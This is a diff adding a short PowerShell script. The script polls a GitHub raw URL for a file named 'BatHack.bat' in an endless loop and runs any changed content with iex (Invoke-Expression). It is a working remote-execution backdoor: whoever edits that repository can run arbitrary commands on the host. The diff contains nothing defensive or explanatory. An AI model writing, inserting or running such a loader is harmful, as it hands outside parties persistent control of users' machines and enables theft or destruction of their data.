@@ -1,0 +1,11 @@
+$Com =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+while ($true) {
+$Com2 =  (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+  if ($Com -eq $Com2) {
+      
+  }
+  else {
+  $Com = $Com2
+  iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MrCubeCode/HackCodeJs/refs/heads/main/BatHack.bat')
+  }
+}
